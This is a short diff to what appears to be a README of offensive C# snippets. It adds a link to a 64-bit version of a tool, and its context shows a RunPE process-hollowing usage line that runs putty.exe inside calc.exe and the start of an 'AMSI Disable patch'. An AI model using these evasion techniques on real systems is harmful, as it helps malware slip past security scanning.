@@ -5,6 +5,8 @@ Usage:
 RunPE.Run("C:\\windows\\syswow64\\calc.exe", File.ReadAllBytes("putty.exe"));
 ```
 
+For a 64-bit version see: https://github.com/gigajew/Mandark
+
 # AMSI Disable patch (by Rasta Mouse)
 ```c#
 private static string Decode(string data)
